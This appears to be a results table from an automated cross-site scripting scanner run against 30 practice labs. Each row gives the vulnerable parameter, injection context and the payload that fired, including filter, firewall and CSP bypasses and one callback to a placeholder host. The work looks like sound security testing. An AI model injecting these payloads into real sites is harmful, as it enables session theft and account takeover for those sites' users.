| # | Lab | Difficulty | Verdict | Parameter | Context | Payload that fired |
|---|-----|-----------|---------|-----------|---------|--------------------|
| 1 | `reflected-html` | APPRENTICE | **CONFIRMED** | `search` | `html_text` | `<script>alert('ixm055cc2ce')</script>` |
| 2 | `stored-html` | APPRENTICE | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixm4c5ca56d')>` |
| 3 | `dom-document.write` | APPRENTICE | **CONFIRMED** | `search` | `html_text` | `x"%09onload%3D"alert('ixm06a943c5')"%09x="` |
| 4 | `dom-innerhtml` | APPRENTICE | **CONFIRMED** | `search` | `html_text` | `</select><svg%20onload%3Dalert('ixm06a943c5')>` |
| 5 | `dom-jquery-href` | APPRENTICE | **CONFIRMED** | `returnPath` | `html_text` | `javascript:alert('ixmf5d7a03f')` |
| 6 | `dom-jquery-selector` | APPRENTICE | **CONFIRMED** | `#fragment` | `url_fragment` | `x:has(<img src=x onerror=alert('ixm51601632')>)` |
| 7 | `attr-double` | APPRENTICE | **CONFIRMED** | `search` | `html_attr_double` | `"onfocus=alert('ixm35fc4a56') autofocus x="` |
| 8 | `href-attr` | APPRENTICE | **CONFIRMED** | `website` | `html_attr_href` | `javascript:alert('ixmcc71ea77')` |
| 9 | `js-string` | APPRENTICE | **CONFIRMED** | `search` | `js_string_single` | `';alert('ixm6f216e5f');//` |
| 10 | `dom-select` | PRACTITIONER | **CONFIRMED** | `storeId` | `html_text` | `</select><svg%20onload%3Dalert('ixme6b2bddc')>` |
| 11 | `angularjs` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `{{constructor.constructor('alert("ixmd11df425")')()}}` |
| 12 | `dom-reflected` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `\"};alert('ixm06a943c5');//` |
| 13 | `dom-stored` | PRACTITIONER | **CONFIRMED** | `comment` | `html_text` | `<><img src=x onerror=alert('ixm69b55d48')>` |
| 14 | `waf-tags` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `<xss popover onbeforetoggle=alert('ixm7b9b721b')>` |
| 15 | `waf-custom-tag` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `<xss autofocus onfocus=alert('ixmc3b67ffc') tabindex=1>` |
| 16 | `svg-allowlist` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `<svg><animatetransform onbegin=alert('ixm8fad9987')></svg>` |
| 17 | `canonical-link` | PRACTITIONER | **CONFIRMED** | `search` | `html_attr_href` | `'accesskey='x'onclick=alert(`ixmfbd1233d`)` |
| 18 | `js-sq-escaped` | PRACTITIONER | **CONFIRMED** | `search` | `js_string_single` | `</script><img src=x onerror=alert('ixmab37ef77')>` |
| 19 | `js-sq-escaped2` | PRACTITIONER | **CONFIRMED** | `search` | `js_string_single` | `\';x=new Image;x.src=`//ixm13d2bab5.ixm.example/x`//` |
| 20 | `onclick-escaped` | PRACTITIONER | **CONFIRMED** | `website` | `js_in_attr` | `http://x&apos;);alert(`ixm9f7d664a`);//` |
| 21 | `template-literal` | PRACTITIONER | **CONFIRMED** | `search` | `js_template` | `${alert(String.fromCharCode(105,120,109,49,48,53,50,102,5…` |
| 22 | `stored-cookie` | PRACTITIONER | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixmb6b44226')>` |
| 23 | `stored-password` | PRACTITIONER | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixmc4ae5083')>` |
| 24 | `stored-csrf` | PRACTITIONER | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixm49d15dcd')>` |
| 25 | `angular-sandbox` | EXPERT | **static-only** | `search` | `html_text` | `{{$eval('alert("ixmdb1d6f29")')}}` |
| 26 | `angular-csp` | EXPERT | **CONFIRMED** | `content` | `html_text` | `<img src=x onerror=alert('ixm6207779f')>` |
| 27 | `waf-events-href` | EXPERT | **CONFIRMED** | `search` | `html_text` | `<svg><a><animate attributeName=href values=javascript:ale…` |
| 28 | `js-url-blocked` | EXPERT | **CONFIRMED** | `postId` | `js_string_single` | `1&'},x=x=%3E{throw/**/onerror=alert,%27ixm73f10df5%27},to…` |
| 29 | `csp-dangling` | EXPERT | **CONFIRMED** | `email` | `html_attr_double` | `"><svg/onload=alert('ixmec2983db')>` |
| 30 | `csp-bypass` | EXPERT | **CONFIRMED** | `search` | `html_text` | `<svg/onload=alert('ixmfaf31068')>` |
